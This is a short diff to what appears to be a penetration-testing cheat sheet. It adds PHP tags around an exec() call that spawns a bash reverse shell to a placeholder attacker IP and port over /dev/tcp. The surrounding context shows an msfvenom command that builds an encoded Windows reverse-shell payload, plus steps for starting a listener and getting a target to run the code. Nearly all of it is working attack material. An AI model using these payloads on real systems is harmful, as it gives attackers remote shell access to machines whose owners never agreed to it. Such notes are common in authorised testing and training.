@@ -54,5 +54,7 @@ msfvenom -p windows/shell_reverse_tcp LHOST=[ATTACK-IP] LPORT=[PORT] -e x86/shik
 1. Start listener on Attack-Machine:
 2. Get target machine to run this PHP code:
 ```
+<?php
 exec("/bin/bash -c 'bash -i >& /dev/tcp/[ATTACK-IP]/[PORT] 0>&1'")
+?>
 ```
